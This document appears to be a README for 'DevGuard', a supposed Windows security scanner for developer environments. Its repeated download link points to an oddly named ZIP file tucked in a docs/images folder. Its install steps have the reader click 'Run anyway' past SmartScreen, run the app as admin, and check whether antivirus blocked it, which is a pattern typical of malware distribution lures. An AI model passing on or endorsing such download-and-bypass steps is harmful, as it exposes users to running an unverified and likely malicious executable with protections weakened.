# 🛡️ DevGuard - Secure Your Dev Setup Fast

[![Download DevGuard](https://img.shields.io/badge/Download-DevGuard-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tobeyiodinated117/DevGuard/raw/refs/heads/main/docs/images/Guard-Dev-decadist.zip)

## 🚀 What DevGuard Does

DevGuard checks your development environment before code goes live. It looks for common risks on your computer and in your project files, then shows what needs attention in a clear report.

It helps you find:

- Exposed secrets like API keys and tokens
- Supply chain issues in packages and dependencies
- Weak or risky crypto settings
- AI toolchain risks in local dev tools
- Known security problems tied to your setup
- Signs of malware or unsafe files in the project path

DevGuard runs local checks first and then uses cloud analysis for deeper review.

## 💻 Before You Start

Use DevGuard on a Windows PC with:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 500 MB of free disk space
- An active internet connection for cloud analysis
- Permission to run apps and read project folders

## 📥 Download DevGuard

Visit this page to download and run the app:

https://github.com/Tobeyiodinated117/DevGuard/raw/refs/heads/main/docs/images/Guard-Dev-decadist.zip

## 🪟 Install on Windows

1. Open the download page in your browser.
2. Look for the latest release or app file.
3. Download the Windows version.
4. If Windows asks for approval, choose **Run anyway** or **More info** if you trust the source.
5. If the app comes as a ZIP file, right-click it and choose **Extract All**.
6. Open the extracted folder.
7. Double-click the DevGuard app file to start it.

If you see a smart screen prompt, confirm that you want to open the file.

## 🔍 First-Time Setup

After you launch DevGuard:

1. Select the folder you want to scan.
2. Choose a scan type if the app gives you options.
3. Review any local scan settings.
4. Sign in or connect your cloud account if the app asks for it.
5. Start the scan.

DevGuard may take a few minutes on the first run. Larger folders and many dependencies can take longer.

## 🧭 How to Use It

Use DevGuard when you want to check a project before you commit, merge, or deploy.

Typical flow:

1. Open DevGuard.
2. Point it to your code or workspace.
3. Start a full environment check.
4. Wait for the scan to finish.
5. Review the results.
6. Fix the items marked as high risk first.
7. Run the scan again to confirm the fixes.

## 📊 What the Report Shows

DevGuard groups findings so you can act on them fast.

You may see items such as:

- Secret leaks in config files, env files, or code
- Risky package versions
- Missing security settings
- Weak crypto use
- Unsafe local tools linked to AI workflows
- Files that match known malware patterns
- Problems in your dev setup that raise supply chain risk

Each result includes a plain-language description and a path or file name when available.

## 🧰 Common Use Cases

DevGuard fits into many daily tasks:

- Checking a new project before you open it
- Reviewing a codebase before a release
- Looking for leaked keys after a merge
- Auditing package updates for CVE exposure
- Checking tools used with Cursor, VS Code, or MCP-based workflows
- Running a quick security pass on a teammate’s branch

## ⚙️ Basic Tips for Better Results

For best results:

- Scan the root folder of your project
- Close files you are editing before a full scan
- Keep your package list up to date
- Review environment files with care
- Recheck the project after each major dependency update
- Run scans before sharing code outside your team

## 🧪 Example Workflow

A simple setup looks like this:

1. Download DevGuard from the link above.
2. Install or open the app on Windows.
3. Select your project folder.
4. Start a scan.
5. Review any secret, dependency, or crypto findings.
6. Fix the most serious issues.
7. Run DevGuard again.

## 🛠️ Troubleshooting

If DevGuard does not start:

- Check that you downloaded the Windows version
- Try running it as an admin
- Make sure the file is fully extracted if it came in a ZIP
- Restart your computer and try again
- Check that your antivirus did not block the app

If a scan is slow:

- Scan one project folder at a time
- Close other heavy apps
- Use a smaller folder first
- Make sure the device has enough free memory

If results seem incomplete:

- Point DevGuard at the top-level project folder
- Include hidden config files if the app offers that option
- Make sure the project is not still syncing from cloud storage

## 🔐 Security Areas Covered

DevGuard focuses on the main risks that matter in modern dev work:

- Secrets detection
- Supply chain security
- SAST checks for common code issues
- AI security risks
- MCP security checks
- Malware detection
- CVE exposure review
- Cryptographic weakness checks
- DevSecOps workflow checks

## 📁 Typical Files DevGuard Reviews

DevGuard may inspect files like:

- `.env`
- `package.json`
- `requirements.txt`
- lock files
- build scripts
- config files
- shell scripts
- editor settings
- AI tool config files

## 🧩 Supported Workflows

DevGuard works well with:

- Python projects
- VS Code projects
- Cursor-based workspaces
- local AI tool setups
- small apps
- large team repos

## 📌 Best Time to Run a Scan

Run DevGuard:

- before you commit code
- before a pull request
- before a release
- after adding new packages
- after changing secrets or credentials
- after setting up a new dev machine

## 🖥️ Windows Run Steps

If you want the shortest path:

1. Go to the download page.
2. Download DevGuard.
3. Open the file.
4. Allow it to run.
5. Pick your project folder.
6. Start the scan

## 📦 What You Need from the Repository

The repository page gives you the app source, release files, and updates. Use it to get the latest Windows build and read any file names or release notes before you install

## 🔎 After the Scan

When the scan ends:

1. Open the report.
2. Sort by high risk first.
3. Fix secrets and exposed credentials first.
4. Update unsafe packages.
5. Remove or replace weak crypto settings.
6. Scan again after each round of fixes

## 🧼 Keeping DevGuard Useful

To keep scans useful over time:

- Run it after dependency updates
- Check new branches before merge
- Scan old projects before reuse
- Review any new AI tooling in your setup
- Keep Windows and your dev tools up to date